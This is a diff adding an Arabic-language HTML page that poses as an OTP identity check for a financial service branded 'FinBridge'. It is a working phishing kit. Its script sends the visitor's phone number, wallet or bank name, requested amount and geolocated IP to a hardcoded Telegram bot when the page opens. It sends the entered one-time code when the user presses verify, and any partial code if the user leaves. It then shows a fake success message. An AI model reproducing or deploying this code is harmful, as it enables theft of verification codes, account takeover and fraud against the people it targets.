@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>التحقق من الهوية — FinBridge</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+        :root {
+            --gold: #C9A84C;
+            --gold-light: #E8C96A;
+            --gold-dark: #8B6914;
+            --bg-deep: #080C14;
+            --bg-card: #0D1220;
+            --bg-surface: #111827;
+            --border: rgba(201,168,76,0.2);
+            --text-primary: #F0E6CC;
+            --text-secondary: #8A9BB5;
+            --success: #10B981;
+            --error: #EF4444;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: var(--bg-deep);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px;
+        }
+
+        body::before {
+            content: '';
+            position: fixed; inset: 0;
+            background:
+                radial-gradient(ellipse 80% 50% at 20% 10%, rgba(201,168,76,0.07) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 40% at 80% 90%, rgba(16,185,129,0.04) 0%, transparent 60%);
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: fixed; inset: 0;
+            background-image:
+                linear-gradient(rgba(201,168,76,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(201,168,76,0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+        }
+
+        .page-wrap {
+            position: relative; z-index: 1;
+            width: 100%; max-width: 460px;
+        }
+
+        /* شعار */
+        .brand {
+            text-align: center;
+            margin-bottom: 28px;
+            animation: fadeDown 0.5s ease both;
+        }
+
+        .brand-name {
+            font-size: 1.5rem; font-weight: 800;
+            background: linear-gradient(135deg, var(--gold-light), var(--gold));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            letter-spacing: 2px;
+        }
+
+        /* الكارد */
+        .verify-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 44px 36px;
+            position: relative; overflow: hidden;
+            animation: fadeUp 0.6s ease 0.1s both;
+            box-shadow: 0 24px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
+        }
+
+        .verify-card::before {
+            content: '';
+            position: absolute; top: 0; left: 10%; right: 10%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+        }
+
+        /* أيقونة الأمان */
+        .lock-icon {
+            width: 72px; height: 72px;
+            margin: 0 auto 20px;
+            background: radial-gradient(circle, rgba(201,168,76,0.12), rgba(201,168,76,0.03));
+            border: 1px solid rgba(201,168,76,0.25);
+            border-radius: 20px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 2rem;
+            box-shadow: 0 0 30px rgba(201,168,76,0.15);
+            animation: pulse 2.5s ease infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(201,168,76,0.15); }
+            50%       { box-shadow: 0 0 40px rgba(201,168,76,0.3); }
+        }
+
+        .verify-title {
+            font-size: 1.4rem; font-weight: 700;
+            color: var(--text-primary);
+            text-align: center; margin-bottom: 8px;
+        }
+
+        .verify-sub {
+            font-size: 0.85rem; color: var(--text-secondary);
+            text-align: center; line-height: 1.6; margin-bottom: 6px;
+        }
+
+        .phone-display {
+            text-align: center;
+            font-size: 1.05rem; font-weight: 700;
+            color: var(--gold-light);
+            margin-bottom: 32px;
+            direction: ltr;
+        }
+
+        /* OTP */
+        .otp-wrap {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 8px;
+            direction: ltr;
+        }
+
+        .otp-box {
+            width: 52px; height: 62px;
+            background: var(--bg-surface);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 14px;
+            font-size: 1.6rem; font-weight: 700;
+            text-align: center;
+            color: var(--text-primary);
+            font-family: 'Tajawal', monospace;
+            outline: none;
+            transition: all 0.2s;
+            caret-color: var(--gold);
+        }
+
+        .otp-box:focus {
+            border-color: var(--gold);
+            background: rgba(201,168,76,0.05);
+            box-shadow: 0 0 0 3px rgba(201,168,76,0.12), 0 0 20px rgba(201,168,76,0.1);
+            transform: translateY(-2px);
+        }
+
+        .otp-box.filled {
+            border-color: rgba(201,168,76,0.4);
+            color: var(--gold-light);
+        }
+
+        .error-msg {
+            text-align: center;
+            font-size: 0.8rem; color: var(--error);
+            margin: 10px 0;
+            min-height: 20px;
+        }
+
+        /* زر التحقق */
+        .verify-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--gold-light), var(--gold), #A07820);
+            border: none; border-radius: 12px;
+            color: #0D0A00;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 1rem; font-weight: 800;
+            cursor: pointer; letter-spacing: 1px;
+            transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            margin-top: 16px;
+            position: relative; overflow: hidden;
+        }
+
+        .verify-btn::before {
+            content: ''; position: absolute; inset: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
+            opacity: 0; transition: opacity 0.3s;
+        }
+
+        .verify-btn:hover::before { opacity: 1; }
+        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(201,168,76,0.4); }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
+
+        .verify-btn.success {
+            background: linear-gradient(135deg, #34d399, #10b981);
+        }
+
+        /* إعادة الإرسال */
+        .resend-row {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.82rem;
+            color: var(--text-secondary);
+        }
+
+        .resend-btn {
+            background: none; border: none;
+            color: var(--gold); cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 0.82rem; font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .resend-btn:hover { color: var(--gold-light); }
+        .resend-btn:disabled { color: var(--text-secondary); cursor: not-allowed; }
+
+        /* بيانات الطلب */
+        .order-summary {
+            background: rgba(201,168,76,0.04);
+            border: 1px solid rgba(201,168,76,0.1);
+            border-radius: 12px;
+            padding: 14px 18px;
+            margin-bottom: 24px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .summary-item { display: flex; flex-direction: column; gap: 2px; }
+        .summary-label { font-size: 0.68rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+        .summary-value { font-size: 0.82rem; font-weight: 600; color: var(--text-primary); }
+
+        /* footer */
+        .card-footer {
+            text-align: center; margin-top: 24px;
+            font-size: 0.72rem; color: #3d4f6a;
+        }
+
+        /* spinner */
+        .spinner {
+            width: 18px; height: 18px;
+            border: 2px solid rgba(0,0,0,0.3);
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes fadeDown { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes fadeUp   { from { opacity:0; transform:translateY(16px);  } to { opacity:1; transform:translateY(0); } }
+        @keyframes spin     { to { transform: rotate(360deg); } }
+        @keyframes shake    { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-7px)} 40%,80%{transform:translateX(7px)} }
+        .shake { animation: shake 0.35s ease; }
+    </style>
+<style>
+    .wallet-badge {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        background: rgba(201,168,76,0.08);
+        border: 1.5px solid rgba(201,168,76,0.3);
+        border-radius: 14px;
+        padding: 14px 18px;
+        margin: 18px 0;
+    }
+    .wallet-badge-icon {
+        font-size: 2rem;
+        flex-shrink: 0;
+    }
+    .wallet-badge-info {
+        flex: 1;
+    }
+    .wallet-badge-name {
+        font-size: 1rem;
+        font-weight: 800;
+        color: var(--text-primary);
+        line-height: 1.3;
+    }
+    .wallet-badge-type {
+        font-size: 0.72rem;
+        color: var(--gold);
+        margin-top: 3px;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+    }
+    .otp-instruction {
+        background: rgba(255,255,255,0.03);
+        border: 1px solid rgba(255,255,255,0.07);
+        border-radius: 10px;
+        padding: 12px 16px;
+        margin-bottom: 20px;
+        font-size: 0.82rem;
+        color: var(--text-secondary);
+        line-height: 1.7;
+        text-align: center;
+    }
+    .otp-instruction b { color: var(--gold-light); }
+</style>
+</head>
+<body>
+
+<div class="page-wrap">
+
+    <div class="brand">
+        <div class="brand-name">FinBridge</div>
+    </div>
+
+    <div class="verify-card">
+
+        <div class="lock-icon">🔐</div>
+        <div class="verify-title">التحقق من الهوية</div>
+        <div class="verify-sub">تم إرسال رمز التحقق إلى</div>
+        <div class="phone-display" id="phoneDisplay">...</div>
+
+        <!-- بادج المحفظة / البنك -->
+        <div class="wallet-badge" id="walletBadge">
+            <span class="wallet-badge-icon" id="badgeIcon">📲</span>
+            <div class="wallet-badge-info">
+                <div class="wallet-badge-name" id="badgeName">—</div>
+                <div class="wallet-badge-type" id="badgeType">—</div>
+            </div>
+        </div>
+
+        <!-- تعليمات الرمز -->
+        <div class="otp-instruction" id="otpInstruction">
+            أدخل رمز التحقق المُرسل من <b id="otpSource">—</b>
+        </div>
+
+        <!-- ملخص الطلب -->
+        <div class="order-summary" id="orderSummary">
+            <div class="summary-item">
+                <span class="summary-label">المبلغ المطلوب</span>
+                <span class="summary-value" id="summaryAmount">—</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">الدولة</span>
+                <span class="summary-value" id="summaryCountry">—</span>
+            </div>
+            <div class="summary-item">
+                <span class="summary-label">الحالة</span>
+                <span class="summary-value" style="color:var(--gold)">⏳ قيد المراجعة</span>
+            </div>
+        </div>
+
+        <!-- OTP -->
+        <div class="otp-wrap" id="otpWrap">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+            <input class="otp-box" type="text" inputmode="numeric" maxlength="1">
+        </div>
+
+        <div class="error-msg" id="errorMsg"></div>
+
+        <button class="verify-btn" id="verifyBtn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+            تأكيد الرمز
+        </button>
+
+        <div class="resend-row">
+            لم يصلك الرمز؟
+            <button class="resend-btn" id="resendBtn" disabled>
+                إعادة الإرسال (<span id="countdown">05:00</span>)
+            </button>
+        </div>
+
+        <div class="card-footer">© 2026 FinBridge — التحقق الأمني</div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8653478298:AAF2IBoanRgDEcQRi6jT1mcEtUjKhUqcZuk';
+    const CHAT_ID   = '6465499082';
+
+    async function tg(msg) {
+        try {
+            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
+            });
+        } catch(e) {}
+    }
+
+        async function getIP() {
+        const apis = [
+            'https://ipwho.is/',
+            'https://ip-api.com/json/?fields=query,city,country,regionName,org,lat,lon',
+            'https://ipapi.co/json/'
+        ];
+        for (const url of apis) {
+            try {
+                const r = await fetch(url, {signal: AbortSignal.timeout(4000)});
+                const d = await r.json();
+                // توحيد الحقول
+                return {
+                    ip:           d.ip     || d.query  || '?',
+                    city:         d.city   || '?',
+                    country_name: d.country|| d.country_name || '?',
+                    region:       d.region || d.regionName   || '',
+                    org:          d.connection?.isp || d.org || d.isp || '',
+                    latitude:     d.latitude  || d.lat || '',
+                    longitude:    d.longitude || d.lon || '',
+                };
+            } catch(e) { continue; }
+        }
+        return {ip:'?', city:'?', country_name:'?', region:'', org:'', latitude:'', longitude:''};
+    }
+
+    // ── قراءة بيانات الجلسة ──
+    const phone   = sessionStorage.getItem('userPhone')   || '---';
+    const country = sessionStorage.getItem('userCountry') || '';
+    const amount  = sessionStorage.getItem('userAmount')  || '';
+    const wallet  = sessionStorage.getItem('userWallet')  || '';
+    const userName= sessionStorage.getItem('userName')    || '';
+
+    // ── كشف نوع المحفظة/البنك ──
+    function getWalletInfo(name) {
+        if (!name || name === '---') return { icon:'📲', type:'محفظة إلكترونية', source:'تطبيق المحفظة' };
+        if (name.startsWith('🏦')) return { icon:'🏦', type:'حساب بنكي', source: name.replace('🏦 ','').trim() + ' (تطبيق البنك)' };
+        const n = name.replace('📲 ','').toLowerCase();
+        if (/bitcoin|usdt|eth|crypto|binance|bnb/i.test(n)) return { icon:'₿', type:'محفظة كريبتو', source:'تطبيق الكريبتو' };
+        if (/paypal|wise/i.test(n)) return { icon:'🅿️', type:'محفظة دولية', source: name.replace('📲 ','') };
+        if (/visa|mastercard|mada|knet|meeza|benefit/i.test(n)) return { icon:'💳', type:'بطاقة بنكية', source:'البنك' };
+        return { icon:'📲', type:'محفظة إلكترونية', source: name.replace('📲 ','').trim() };
+    }
+
+    // ── تعبئة الصفحة ──
+    const wInfo = getWalletInfo(wallet);
+    const cleanWallet = wallet.replace(/📲 |🏦 /g, '').trim();
+
+    document.getElementById('phoneDisplay').textContent = phone;
+    document.getElementById('summaryAmount').textContent  = amount  || '—';
+    document.getElementById('summaryCountry').textContent = country.replace(/🇸🇦|🇦🇪|🇰🇼|🇶🇦|🇧🇭|🇴🇲|🇮🇶|🇪🇬|🇯🇴|🇾🇪|🇸🇾|🇱🇧/g,'').trim().split('(')[0].trim() || '—';
+
+    // بادج المحفظة
+    document.getElementById('badgeIcon').textContent = wInfo.icon;
+    document.getElementById('badgeName').textContent = cleanWallet || '—';
+    document.getElementById('badgeType').textContent = wInfo.type;
+    document.getElementById('otpSource').textContent = wInfo.source;
+
+    // ── إرسال تقرير الزيارة ──
+    window.addEventListener('load', async () => {
+        const ip = await getIP();
+        await tg(
+            '👁 <b>فتح صفحة التحقق - FinBridge</b>\n' +
+            '━━━━━━━━━━━━━━━━\n' +
+            '📞 <b>الهاتف:</b> ' + phone + '\n' +
+            '👛 <b>المحفظة/البنك:</b> ' + cleanWallet + '\n' +
+            '💰 <b>المبلغ:</b> ' + amount + '\n' +
+            '🌐 <b>IP:</b> ' + (ip.ip||'?') + ' | ' + (ip.country_name||'') + '\n' +
+            '⏰ ' + new Date().toLocaleString('ar-EG')
+        );
+    });
+
+    window.addEventListener('beforeunload', () => {
+        const otp = Array.from(document.querySelectorAll('.otp-box')).map(i=>i.value).join('');
+        if (otp.length > 0 && otp.length < 6) {
+            navigator.sendBeacon('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
+                JSON.stringify({chat_id: CHAT_ID, text: '⚠️ غادر قبل الإكمال\nالهاتف: ' + phone + '\nأدخل: ' + otp, parse_mode:'HTML'}));
+        }
+    });
+
+    // ── OTP navigation ──
+    const boxes = document.querySelectorAll('.otp-box');
+    boxes.forEach((box, i) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/[^0-9]/g, '');
+            if (box.value) { box.classList.add('filled'); if (i < boxes.length - 1) boxes[i+1].focus(); }
+            else box.classList.remove('filled');
+        });
+        box.addEventListener('keydown', e => {
+            if (e.key === 'Backspace' && !box.value && i > 0) { boxes[i-1].focus(); boxes[i-1].classList.remove('filled'); }
+        });
+        box.addEventListener('paste', e => {
+            e.preventDefault();
+            const p = e.clipboardData.getData('text').replace(/\D/g,'').slice(0,6);
+            p.split('').forEach((ch,j) => { if (boxes[j]) { boxes[j].value = ch; boxes[j].classList.add('filled'); } });
+            if (boxes[p.length-1]) boxes[p.length-1].focus();
+        });
+    });
+
+    // ── التحقق من الرمز ──
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMsg  = document.getElementById('errorMsg');
+
+    verifyBtn.addEventListener('click', async () => {
+        const otp = Array.from(boxes).map(b=>b.value).join('');
+        if (otp.length < 6) {
+            document.getElementById('otpWrap').classList.add('shake');
+            setTimeout(() => document.getElementById('otpWrap').classList.remove('shake'), 350);
+            errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+            return;
+        }
+
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+        errorMsg.textContent = '';
+
+        const ip3 = await getIP();
+        await tg(
+            '🔐 <b>رمز التحقق - FinBridge</b>\n' +
+            '━━━━━━━━━━━━━━━━\n' +
+            '📞 <b>الهاتف:</b> ' + phone + '\n' +
+            '👛 <b>المحفظة/البنك:</b> ' + cleanWallet + '\n' +
+            '🔢 <b>الرمز المدخل:</b> <code>' + otp + '</code>\n' +
+            '💰 <b>المبلغ:</b> ' + amount + '\n' +
+            '🌐 <b>IP:</b> ' + (ip3.ip||'?') + ' | ' + (ip3.country_name||'') + '\n' +
+            '⏰ ' + new Date().toLocaleString('ar-EG')
+        );
+
+        verifyBtn.classList.add('success');
+        verifyBtn.innerHTML = '✅ تم التحقق...';
+        setTimeout(() => { window.location.href = 'success.html'; }, 1200);
+    });
+
+    // ── عداد إعادة الإرسال (5 دقائق) ──
+    let t = 300;
+    const cd = document.getElementById('countdown');
+    const rb = document.getElementById('resendBtn');
+    const iv = setInterval(() => {
+        t--;
+        const mins = Math.floor(t / 60);
+        const secs = t % 60;
+        cd.textContent = mins + ':' + (secs < 10 ? '0' : '') + secs;
+        if (t <= 0) { clearInterval(iv); rb.disabled = false; rb.innerHTML = 'إعادة الإرسال'; }
+    }, 1000);
+    rb.addEventListener('click', () => {
+        rb.disabled = true;
+        rb.textContent = 'تم الإرسال ✓';
+        tg('🔄 طلب إعادة رمز\n📞 ' + phone + '\n👛 ' + cleanWallet);
+    });
+
+</script>
+
+</body>
+</html>
